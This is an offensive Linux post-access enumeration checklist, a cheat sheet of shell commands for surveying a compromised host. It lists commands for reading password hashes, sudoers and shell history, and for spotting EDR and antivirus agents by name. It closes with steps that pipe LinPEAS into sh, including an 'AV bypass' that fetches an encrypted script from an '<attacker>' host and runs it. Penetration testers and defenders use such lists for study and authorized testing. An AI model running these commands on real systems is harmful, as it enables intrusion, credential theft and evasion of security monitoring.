# Linux Post-Access Enumeration Checklist

## System Identification
```bash
whoami                                  # Current user
id                                      # UID, GID, supplementary groups
hostname                                # Hostname
hostname -f                             # FQDN
uname -a                                # Kernel version, arch
cat /etc/os-release                     # Distro name and version
cat /etc/issue                          # Login banner
cat /proc/version                       # Kernel compile info
lsb_release -a 2>/dev/null             # Distro details (if installed)
arch                                    # Architecture (x86_64, aarch64)
uptime                                  # System uptime and load
date                                    # Date/time/timezone
timedatectl 2>/dev/null                # Detailed time configuration
```

## Current User Context
```bash
id                                      # All group memberships
groups                                  # Group names only
sudo -l 2>/dev/null                    # Sudo permissions for current user
cat /etc/sudoers 2>/dev/null           # Full sudo config (needs root)
cat /etc/sudoers.d/* 2>/dev/null       # Drop-in sudo rules
env                                     # Environment variables
echo $PATH                             # PATH (look for writable dirs)
echo $SHELL                            # Current shell
cat ~/.bashrc                          # Bash config (may contain aliases/creds)
cat ~/.bash_profile                    # Login profile
cat ~/.profile                         # User profile
history 2>/dev/null                    # Command history
cat ~/.bash_history                    # Bash history file
```

## User Enumeration
```bash
cat /etc/passwd                         # All local users (format: user:x:uid:gid:info:home:shell)
cat /etc/shadow 2>/dev/null            # Password hashes (root required)
cat /etc/group                          # All groups and members
getent passwd                           # NSS-aware (includes LDAP/NIS users)
getent group                            # NSS-aware groups
awk -F: '$3 == 0 {print $1}' /etc/passwd       # UID 0 users (root-equivalent)
awk -F: '$3 >= 1000 {print $1}' /etc/passwd    # Regular users (UID >= 1000)
awk -F: '$7 !~ /nologin|false/ {print $1}' /etc/passwd  # Users with login shells
who                                     # Currently logged in
w                                       # Logged in with activity
last -20                                # Recent login history
lastlog                                 # Last login per user
finger -lmsp 2>/dev/null              # User details (if finger installed)
```

## Network Configuration
```bash
ip a                                    # All interfaces and addresses
ip -4 addr                              # IPv4 addresses only
ip -6 addr                              # IPv6 addresses only
ip route                                # Routing table
ip neigh                                # ARP table
arp -a 2>/dev/null                     # ARP table (legacy)
cat /etc/resolv.conf                    # DNS configuration
cat /etc/hosts                          # Static host mappings
cat /etc/hostname                       # Hostname file
cat /etc/network/interfaces 2>/dev/null         # Debian net config
cat /etc/sysconfig/network-scripts/ifcfg-* 2>/dev/null  # RHEL net config
nmcli dev show 2>/dev/null             # NetworkManager details
```

## Listening Services & Connections
```bash
ss -tlnp                                # Listening TCP with PIDs
ss -ulnp                                # Listening UDP with PIDs
ss -antp                                # All TCP connections
netstat -antp 2>/dev/null              # Alternative (legacy)
netstat -tlnp 2>/dev/null             # Alternative listening TCP
lsof -i -P -n 2>/dev/null             # Open network files
```

## Process & Service Enumeration
```bash
ps aux                                  # All processes
ps auxf                                 # Process tree
ps -eo user,pid,ppid,%cpu,%mem,args --sort=-%mem | head -30  # Top memory consumers
top -bn1 | head -30                    # Top snapshot
systemctl list-units --type=service --state=running   # Running systemd services
systemctl list-units --type=service --all             # All systemd services
service --status-all 2>/dev/null       # SysV services
chkconfig --list 2>/dev/null           # SysV service autostart (RHEL)
```

## Installed Software
```bash
dpkg -l 2>/dev/null                    # Debian/Ubuntu packages
dpkg -l | grep -iE "python|perl|ruby|java|gcc|make|nmap|nc|wget|curl"  # Useful tools
rpm -qa 2>/dev/null                    # RHEL/CentOS packages
apt list --installed 2>/dev/null       # APT listing
yum list installed 2>/dev/null         # YUM listing
pacman -Q 2>/dev/null                  # Arch packages
pip list 2>/dev/null                   # Python packages
pip3 list 2>/dev/null                  # Python3 packages
which python python3 perl ruby gcc make nmap nc wget curl 2>/dev/null  # Available tools
```

## Scheduled Tasks
```bash
crontab -l 2>/dev/null                 # Current user crontab
ls -la /etc/cron*                      # System cron directories
cat /etc/crontab                       # System crontab
ls -la /var/spool/cron/crontabs/ 2>/dev/null    # All user crontabs
cat /var/spool/cron/crontabs/* 2>/dev/null      # Read all crontabs (root)
systemctl list-timers --all            # Systemd timers
find / -name "*.timer" -type f 2>/dev/null      # Timer unit files
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u $user -l 2>/dev/null && echo "--- $user ---"
done                                   # All user crontabs (root)
```

## Filesystem & Permissions
```bash
# SUID binaries (privilege escalation candidates)
find / -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# World-writable files and directories
find / -writable -type d 2>/dev/null | head -30
find / -writable -type f 2>/dev/null | head -30

# Files owned by current user (outside home)
find / -user $(whoami) -not -path "/home/*" -not -path "/proc/*" -type f 2>/dev/null | head -30

# Recently modified files
find / -mmin -60 -type f 2>/dev/null | head -30

# Capabilities
getcap -r / 2>/dev/null

# Mounted filesystems
mount
df -h
cat /etc/fstab
```

## Firewall & Security
```bash
iptables -L -n -v 2>/dev/null         # iptables rules (root)
iptables -t nat -L -n -v 2>/dev/null  # NAT rules (root)
ip6tables -L -n -v 2>/dev/null        # IPv6 rules (root)
nft list ruleset 2>/dev/null           # nftables rules (root)
ufw status verbose 2>/dev/null         # UFW status (Ubuntu)
firewall-cmd --list-all 2>/dev/null    # firewalld (RHEL)
cat /etc/selinux/config 2>/dev/null    # SELinux config
getenforce 2>/dev/null                 # SELinux status
aa-status 2>/dev/null                  # AppArmor status
```

## Security Tools Detection
```bash
# EDR/AV/monitoring agents
ps aux | grep -iE "falcon|crowdstrike|sentinel|carbon|cylance|sophos|eset|clam|osquery|wazuh|auditd|ossec|snort|suricata|tripwire"
systemctl list-units | grep -iE "falcon|cbd|sentinel|sophos|clam|osquery|wazuh|auditd|ossec"
ls /opt/CrowdStrike/ /opt/carbonblack/ /opt/SentinelOne/ /opt/sophos/ 2>/dev/null
cat /etc/audit/auditd.conf 2>/dev/null     # Audit daemon config
auditctl -l 2>/dev/null                     # Active audit rules
```

## Automated Enumeration
```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a | tee /dev/shm/linpeas.txt

# LinPEAS (AV bypass — encrypted transfer)
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:key123 -in linpeas.sh -out lp.enc
curl <attacker>/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:key123 | sh

# pspy (process monitoring without root)
./pspy64 -pf -i 1000
./pspy64 -r /tmp -r /etc/cron.d -r /var/spool/cron
```
